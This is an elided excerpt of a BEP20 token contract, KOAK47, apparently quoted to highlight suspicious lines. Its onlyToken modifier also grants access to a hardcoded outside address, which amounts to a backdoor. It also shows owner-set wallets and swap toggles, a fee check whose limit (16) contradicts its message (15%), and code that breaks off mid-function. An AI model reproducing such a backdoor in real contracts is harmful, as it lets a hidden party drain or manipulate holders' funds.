...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0xF14c109B5657cae81A01754D6ddC2a034589B18A)); _;
    }
...
contract KOAK47 is IBEP20 , Auth, BaseToken {
    ...
    address public marketingWallet = 0xe9947dD5722d165b83bbc0DA863468c0DCAa7B09;
    ...
    constructor(
		...
		_walletMax = _totalSupply.div(100);
        ...
        require(totalFee <= 16, "Total fee is over 15%");
        ...
        // NICE!
        autoLiquidityReceiver = 0x8B26195ae4B66A915A15EB3103eCaB4b5Dc757b6;
 
        anothermarketingWallet = 0xe9947dD5722d165b83bbc0DA863468c0DCAa7B09;
        anothermarketingWallet2 = 0xe9947dD5722d165b83bbc0DA863468c0DCAa7B09;       
    ...
    function setSwapsEnabled(bool _enabled) external authorized {
...
if(!isFeeExempt[sender]&&!isFeeExempt[recipient]){
    bool isswaps = true;
        ...
        {
            if(_balances[recipient].add(amount) >= _walletMax)
            {
